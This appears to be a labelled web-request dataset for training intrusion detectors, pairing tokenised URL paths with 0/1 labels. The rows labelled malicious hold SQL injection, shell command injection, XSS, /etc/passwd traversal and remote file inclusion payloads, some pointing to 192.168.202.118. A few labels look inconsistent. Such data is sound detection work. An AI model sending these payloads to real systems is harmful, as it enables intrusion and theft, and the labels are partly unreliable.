request	label
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qtrmrj )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ h5sc3gxy . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 ,  ( select  ( case when  ( 9644 = 9644 )  then dbms_pipe . receive_message ( chr ( 75 )  |  | chr ( 78 )  |  | chr ( 104 )  |  | chr ( 98 )  , 5 )  else 1 /  ( select 0 from dual )  end )  from dual ) 	1
/ yourcity_34827 / 	0
/ string / modo = registro & login = junmeng & password = in8ros742tiva & nombre = juventino & apellidos = vaquer + gorigoitia & email = kuravlev @ minimizar . ve & dni = 97531792q & direccion = calle + llansa ,  + s / n ,  + 1a & ciudad = cadrete & cp = 10739 & provincia = castelln & ntc = 0851327510236186 & b1 = registrar 	0
/ string / strings / parameters = dafydd @ mytanga . nf 	0
/ help . php ? q = ver \ x0c > q77626753 & rem \ x0c 	1
/ string / strings / parameters = fredesvinda 	0
/ javascript / pro . vb 	0
/ little-marme / 	0
/ javascript / mambo . inc 	0
/ 037705 / 	0
"/ g3w7y7u5 . php3 ?  < meta http-equiv = set-cookie content =  "" testbfpq = 3326 ""  > "	1
/ view_316 / 	0
/ exchange-connector / 	0
/ string / strings / parameters = 5036778650405780 	0
/ javascript / foo . exe 	1
/ 2002issues / 	0
/ javascript / staff . exe 	1
"/ help . php ? q =  ""  & rm \ x09q66374774 & rem \ x09 "	1
/ en-us / account / way-board / way-board . cgi ? db =  / etc / passwd \ x00 	1
/ string / strings / parameters = 5527948175762743 	0
/ string / strings / parameters = celso 	0
/ examples / jsp / checkbox / squirrelcart / cart_content . php ? cart_isp_root =  / etc / passwd \ x00 	1
/ 817957 / 	0
/ hng1698 / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  ; select  ( case when  ( 1898 = 4705 )  then 1898 else 1 /  ( select 0 )  end )  -- "	1
"/ string / strings / parameters = '  |   [  8 -ne  $  ( echo jvvwqm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ recentlyavailable / 	0
/  % uff0e % uff0e /  % uff0e % uff0e /  % uff0e % uff0e /  % uff0e % uff0e /  % uff0e % uff0e /  { file } 	1
/ 5005-03 / 	0
/ javascript / x . bat 	0
/ folder3115_doc / 	0
/ examples / jsp / error / common / visiteurs / include / menus . inc . php ? lvc_include_dir =  / etc / passwd \ x00 	1
/ javascript / test1234 . htm 	0
/ string / strings / parameters = |   [  7 -ne  $  ( echo ehxctp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ themanifestoof169960 / 	0
"/ string / strings / parameters = ""  `  '  >  < script >  \ xf0 \ x90 \ x96 \ x9ajavascript : alert ( 1 )  <  / script > "	1
/ string / strings / parameters = raina . schiavelli @ hosterialasmajadillas . de 	0
/ javascript / standards . stackdump 	0
/ 22google / 	0
/ javascript / dblclk . part 	0
/ string / strings / parameters = 1827 	0
/ chizeto / 	0
/ notification / 	0
/ string / strings / parameters = |   [  3 -ne  $  ( echo tnsrys  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / strings / parameters = mahonri 	0
/ 164739 / 	0
/ 154382 / 	0
/ string / strings / parameters = 47649 	0
"/ top . php ? stuff =  ""  \ x0auname \ x09 > q64118446 \ x09 # "	1
/ esmozg5d . kspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 07194416q 	0
/ string / strings / parameters = brinton2 @ tartasconamor . lr 	0
/ friends-10 / 	0
/ html / admin / modules / plugin_admin . php ? _settings [ pluginpath ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	0
/ abitnf7m / 	0
"/ apavxugx . jspa ?  < script > document . cookie =  "" testdnbh = 5237 ;  ""  <  / script > "	1
/ 000110203 / 	0
/ javascript / page2 . php3 	0
/ string / modo = registro & login = abagael & password = acu7ntiar & nombre = nahiara & apellidos = lucas + fiallega & email = kamber @ weat . gd & dni = 47628834c & direccion = carrer + nostra + sra + del + pilar ,  + 101 +  & ciudad = sant + quirze + del + valls & cp = 29360 & provincia = toledo & ntc = 4979216909976076 & b1 = registrar 	0
/ eventslogo / 	0
/ 139262 / 	0
/ string / strings / parameters = '  |  | echo bhfqiy $  (  ( 13 + 3 )  )  $  ( echo bhfqiy ) bhfqiy | 	1
/ post-53 / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' ssvp '  where 3300 = 3300 or 2367 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
/ string / strings / parameters = ; echo hlwpgl $  (  ( 69 + 63 )  )  $  ( echo hlwpgl ) hlwpgl \ 	1
/ examples / servlets / servlet / includes / config . php ? relative_script_path = http :  /  / xxxxxxx 	1
/ javascript / legal . png 	0
/ main . php ? logout =  '  ; del q89385457  # 	1
/ string / strings / parameters = orgulleza 	0
/ palm_tx / 	0
/ string / strings / parameters = ( cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 7992 = 7992 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  ) 	1
/ string / strings / parameters = ;  str =  $  ( echo ewchct )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ string / strings / parameters = r-evu4lo 	0
/ examples / jsp / jsp2 / el / rot13sj . cgi ?  / etc / passwd 	1
"/ help . php ? q =  ""  | ping \ xa0-w \ xa010000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0 "	1
/ phpmyadmin / ncbook / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10 	1
/ examples / jsp / error / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ javascript / removal . sh 	0
/ string / strings / parameters = 7721560580439665 	0
/ torvalds_linus / 	0
/ schoolsdepts / 	0
/ string / strings / parameters = 03812 	0
/ studentenstatuut / 	0
/ zapplayer / 	0
/ ht8pn8uq . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 67231-24366 / 	0
/ string / strings / parameters = arevalo ,  17 	0
/ string / modo = registro & login = yueping1 & password = f9e2dora & nombre = harissa & apellidos = aregall + picabea & email = goorwitz-sejbalova @ hostingprofessional . com . jobs & dni =  ' 2641170p & direccion = risueo + 141 ,  +  & ciudad = font + d ' en + carrs ,  + la & cp = 29551 & provincia = huelva & ntc = 3999806738331009 & b1 = registrar 	1
/ ask ped-tm / 	0
"/ string / strings / parameters = ""   str =  $  ( echo pwtjau )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ 060713hawaiipuc / 	0
/ string / strings / parameters = 1 '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 -- 	1
"/ 1r8cfrlf . php ?  < meta http-equiv = set-cookie content =  "" testydan = 5106 ""  > "	1
/ string / strings / parameters = 1 '  +  ( select tvpj where 7058 = 7058 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  +  ' 	1
/ 1163872637utc / 	0
/ string / modo = registro & login = herling & password = 7ed1l & nombre = damisa & apellidos = bouchot + betancur & email = etienne-wray @ juegois . je & dni = 29850288z & direccion = travesia + poeta + noriega + varela + 118 + 13f & ciudad = forcarei & cp = 17853 & provincia = jan & ntc = 8461933657900272 & b1 = registrar 	0
/ string / strings / parameters = 1 )  )  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- 	1
/ franz ferdinand - live glastonbury 2004 / 	0
/ ms_voip / 	0
/ calculators_mortgage / 	0
/ javascript / downloads . exe 	1
/ string / strings / parameters = |   [  2 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ it ' s a wonderful life - alchemy_rg / 	1
/ main . php ? stuff = 1985387140 and 1 = 1 	0
/  % uff0e % uff0e \  { file } 	1
/  .  .  /  /  /  .  .  /  /  /  .  .  /  /  /  .  .  /  /  /  { file } 	1
/ 6413182a / 	0
/ 187203 / 	0
"/  ?  < meta http-equiv = set-cookie content =  "" testnago = 4518 ""  > "	1
/  ' 	1
/ string / strings / parameters = plaza cruz caamelar s / 	0
/ 115555 / 	0
/ crypto-appl / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo zgyobq )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ cgi-perl / fileseek2 . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head = 	1
/ examples / jsp / jsp2 / el / detail . asp ? nchannel =  ' 1 	1
/ string / modo = registro & login = zunuzi & password = 3j & nombre = idelfonsa & apellidos = girones & email = haeussler @ corjet . jo & dni = 46606571s & direccion = calle + asturias + 158 + 6h & ciudad = trbena & cp = 43877 & provincia = soria & ntc = 7973761744992556 & b1 = registrar 	0
/ string / strings / parameters = carson 	0
/ xcolumns_v1 / 	0
/ q73867152 	0
"/ string / strings / parameters = 1 %  ""  ""  )  union all select null , null , null , null , null , null , null , null -- "	1
/ whoisfrench / 	0
/ string / strings / parameters = fiodorov @ contactomujeres . kr 	0
/ string / strings / parameters = tuset mendel 	0
"/ string / strings / parameters = -4522 ""  ""  )  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  ""  "" mbkq ""  ""  =  ""  "" mbkq "	1
/ string / modo = registro & login = ervin & password = nodal & nombre = agustn & apellidos = artigas + girut & email = mattos @ velazquezlarraaga . dd & dni = 55912738z & direccion = c /  + torcuato + perez ,  + 69 ,  +  & ciudad = candelario & cp = 41960 & provincia = len & ntc = 7208264078394889 & b1 = registrar 	0
/ string / strings / parameters = 6179809121531443 	0
/ string / strings / parameters = 08507068n 	0
"/ string / strings / parameters = < var onmouseover =  "" prompt ( 1 )  ""  > on mouse over <  / var > "	1
/ string / strings / parameters = 1 '  +  ( select ttae where 4601 = 4601 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  )  +  ' 	1
/ string / modo = registro & login = cancela & password = es + teatita & nombre = ivana & apellidos = pampanas + soto & email = tomono @ esteticadayda . az & dni = 98585223r & direccion = nao + victoria ,  + 79 ,  + 12 ? h & ciudad = zarzuela & cp = 32633 & provincia = madrid & ntc = 3891386369836978 & b1 = registrar 	0
/ string / modo = registro & login = schenck6 & password = otorgadera & nombre = balbino & apellidos = zapata + pine ?  & email = falconetti @ normatic-vending . ar & dni = 77359416c & direccion = calle + lope + de + vega + 19 +  & ciudad = valle + de + losa & cp = 02270 & provincia = valladolid & ntc = 2171024439369893 & b1 = registrar 	1
"/ string / strings / parameters = ""  |   [  9 -ne  $  ( echo cinwsa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & "	1
/ string / strings / parameters = hermine @ 943 . mw 	0
/ 825483 / 	0
/ 1004359057 / 	0
/ helger / 	0
/ 11jul06-ribaat / 	0
/ javascript / records . doc 	0
/ libevent-users / 	0
/ string / modo = registro & login = dirac & password = instruidor-a & nombre = helvetia & apellidos = tejera + handal & email = poli @ pavimentosalagon . ga & dni = 22640068h  & direccion = c /  + mangela + s / n ,  +  & ciudad = puras & cp = 47360 & provincia = palencia & ntc = 6085790746283877 & b1 = registrar 	1
/ classes / auth / openid / sreg . php ? _env [ asicms ]  [ path ]  = xxpathxx 	1
/ string / strings / parameters = whiskin 	0
"/ 9kr0ih0v . fts ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
"/ main . php ? stuff =  ""  & uname \ x09 > q54676593 \ x09 # "	1
/ wine-users / 	0
/ richard pryor-live on the sunset strip mentalrg / 	0
/ javascript / survey . as 	0
/ string / strings / parameters = 7ed1l 	0
/ javascript / closing . cc 	0
/ string / strings / parameters = orford 	0
"/ h5i6crm3 . html ?  < script > document . cookie =  "" testlihk = 7070 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  )  where 6387 = 6387 and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  -- 	1
/ string / modo = registro & logina = allyce & password = 9a64nejo & nombre = mayco & apellidos = pulido + curt & email = rogel @ soyrojo . um & dni = 98584189w & direccion = rafael + salgado + 140 ,  +  & ciudad = campos + del + ro & cp = 37419 & provincia = zaragoza & ntc = 2410127429866610 & b1 = registrar 	1
/ chu chu rocket - adgloride / 	0
/ sertap-ask olmez / 	0
"/ main . php ? logout =  ""  \ x0asleep \ x097 \ x09 # "	1
/ string / strings / parameters = monzon pinart 	0
/ javascript / nc . so 	0
/ 146963 / 	0
/ string / strings / parameters = 1 '  )  )  )  and 8162 = 1687 and  (  (  (  ' tdyr '  like  ' tdyr 	1
"/ jnv890lt . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = entrar & login = konstanc & pwd = escenogrfica & remember = off & b1 = entrar 	0
/ javascript / sav . ora 	0
/ javascript / forums . rtf 	0
/ string / strings / parameters = glazer 	0
/ string / strings / parameters = 3581640568970302 	0
/ 294783 / 	0
/ index . php ? src = 1 & _common = 1 & time = 1332010405 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ main . php ? stuff =  '  & uname  > q83741819  # 	1
/ string / strings / parameters = 1 '  where 8277 = 8277 or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  -- 	1
/ string / strings / parameters = 9789 	0
/ draftpatentstatuteddc / 	0
/ string / strings / parameters = polvo 	0
/ flopydrwk / 	0
/ string / strings / parameters = frambueso 	0
/ string / strings / parameters = 1 '  )  )  )  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) vwyq )  # 	1
/ string / strings / parameters = -9434 '  )  union all select 3106 # 	1
/ n_logo / 	0
/ string / strings / parameters = lorenson-tordi @ youtubeanunciox . fk 	0
/ string / strings / parameters = |  | echo veaonc $  (  ( 56 + 45 )  )  $  ( echo veaonc ) veaonc 	1
/ string / modo = registro & login = zaharoff0 & password = ope267s4ic4 & nombre = inmaculada & apellidos = madrigal + puigb & email = crast_litel @ cortell . al & dni = 42685012w & direccion = masia + can + rei + 193 ,  + 8d & ciudad = limpias & cp = 33180 & provincia = barcelona & ntc = 7910538337072686 & b1 = registrar 	0
/ string / strings / parameters = 1 %  '  or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  '  %  '  =  ' 	1
/ javascript / 4 . pl 	0
/ sexy-blonde / 	0
/ ra snail mail v1 / 	0
/ 678476525 / 	0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 23 . 202 / main . php ? logout = 1 & frm_user =  & scr_height =  & scr_width = q25559316 	1
/ string / strings / parameters = alegra 	0
/ border / 	0
/ string / strings / parameters = '  |  | utl_inaddr . get_host_name (  ( select + user + from + dual )  ) 	1
/ string / modo = insertar & precio = 2969 & b1 = pasar + por + caja 	0
/ scripts / gallery . scr . php ? globals [ pth ]  [ func ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ? 	1
/ javascript / match . dll 	0
/ top . php ? stuff =  '  | sleep 8  # 	1
/ aarnout_brombacher / 	0
/ string / strings / parameters = | echo $ ifscypehe $  (  ( 10 + 73 )  )  $  ( echo $ ifscypehe ) cypehe & 	1
/ string / strings / parameters = 1 %  '  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  '  %  '  =  ' 	1
/ string / strings / parameters = 1558387364197747 	0
/ feed-cd / 	0
/ election06_454x30 / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ examples / jsp / checkbox / file . php ? path =  / etc / passwd \ x00 	1
/ string / strings / parameters = ajamil 	0
"/ ygkjkngd . jspa ?  < script > document . cookie =  "" testnago = 4518 ;  ""  <  / script > "	1
/ javascript / 3g . svn-base 	0
/ string / modo = insertar & precio = 9182 & b1 = confirmar 	0
/ mzewnje2 / 	0
/ more-stores_business / 	0
/ examples / jsp / num / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl 	1
/ string / modo = registro & login = bumstead & password = 3ulga5izado4a & nombre = neife & apellidos = barrero & email = chester_farmer @ eneltajo . no & dni = 30341163t & direccion = paseo + san + eugenio + 9 + 10a & ciudad = prjano & cp = 32737 & provincia = vila & ntc = 044425677026812 & b1 = registrar 	1
/ armcit / 	0
/ 126144 / 	0
/ javascript / products . exe 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo wbdhxy )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # "	1
"/ t7tm4m0b . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ rpxyx07v . htm ?  < script > document . cookie =  "" testbnli = 1975 ;  ""  <  / script > "	1
/ j_powder / 	0
/ string / strings / parameters = vino rioja 	0
"/ examples / jsp / cal / nessus ""  >  < script > alert (  ' mod_perl_status_uri_xss . nasl '  )  <  / script > "	1
/ d70-settings / 	0
/ featuresc / 	0
/ javascript / _files . gz 	0
/ string / strings / parameters = deleandra 	0
/ string / strings / parameters = suspen3edo7 	0
/ string / strings / parameters = 1421 	0
"/ javascript /  . htaccess /  ""  ` true `  "" "	1
/ string / strings / parameters = -8876 '  )  )  or 3038 = 3038 	1
/ searchfooter / 	0
/ string / strings / parameters = 1 and make_set ( 9681 = 4703 , 4703 )  #  zbrf 	1
/ 211384 / 	0
"/ main . php ? logout =  "" ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; "	1
"/ jw64yq8u . do ?  < script > document . cookie =  "" testylfu = 1313 ;  ""  <  / script > "	1
/ string / strings / parameters = calle fausto fraile 0 	0
"/ string / strings / parameters = echo nrcxss $  (  ( 87 + 18 )  )  $  ( echo nrcxss ) nrcxss "" "	1
/ string / strings / parameters = ibazeta montells 	0
/ 107762 / 	0
/ examples / servlets / servlet / pwcgi / smpwservicescgi . exe ? target = http :  /  / www . nessus . org 	1
/ manager / add_url . htm ? node =  < script > alert (  ' xss '  )  <  / script > 	1
/ string / strings / parameters = kuss @ inoxled . jobs 	0
"/ zln2hm2z . asp ?  < script > document . cookie =  "" testblcp = 8120 ;  ""  <  / script > "	1
